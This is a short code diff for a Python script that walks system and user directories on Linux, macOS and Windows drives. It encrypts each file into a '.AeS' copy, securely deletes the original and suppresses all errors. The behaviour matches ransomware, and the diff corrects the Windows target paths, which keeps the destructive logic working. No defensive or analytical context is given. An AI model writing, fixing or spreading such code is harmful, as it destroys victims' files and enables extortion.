@@ -100,7 +100,7 @@ if sys.platform.lower() in ["linux", "darwin"]:
     paths = "/home", "/media", "/mnt", "/etc", "/run", "/srv", "/opt", "\var"  # "/usr"  #, "/root"
 
 elif sys.platform.lower() in ["win32", "win64", "windows", "nt"]:
-    paths = "C:\\ ", "D:\\ ", "E:\\ ,""."
+    paths = "C:/", "D:/", "/ ", "."
 
 else:
     raise Exception("Unknown OS")
@@ -170,7 +170,7 @@ class AesExcalibur:
             encrypted = self.encrypt(plain_text)
             with open(file_name + ".AeS", 'wb+') as f:
                 f.write(encrypted)
-            secure_delete(file_name)  # Remove the original in a the same thread pool
+            secure_delete(file_name)  # Remove the original file in a the same thread pool
             self.total += 1
         except (IOError, ValueError, FileNotFoundError, Exception):
             pass  # Suppress output for progress bars
